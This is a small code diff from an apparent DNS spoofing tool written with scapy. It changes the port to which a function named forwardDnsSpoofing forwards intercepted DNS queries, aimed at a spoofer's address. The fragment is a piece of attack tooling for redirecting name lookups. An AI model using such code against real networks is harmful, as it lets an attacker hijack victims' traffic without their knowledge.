@@ -49,7 +49,7 @@ def forwardDnsSpoofing(spooferIP):
             print('DNS Forwarding')
             # oldL3Socket = scapy.conf.L3socket
             # scapy.conf.L3socket = scapy.L3RawSocket
-            newPacket = IP(dst=spooferIP) / UDP(sport=orgPacket[UDP].sport, dport=5353) / DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname))
+            newPacket = IP(dst=spooferIP) / UDP(sport=orgPacket[UDP].sport, dport=25564) / DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname))
             newPacket.show()
             answer = scapy.sr1(newPacket)
             # scapy.conf.L3socket = oldL3Socket
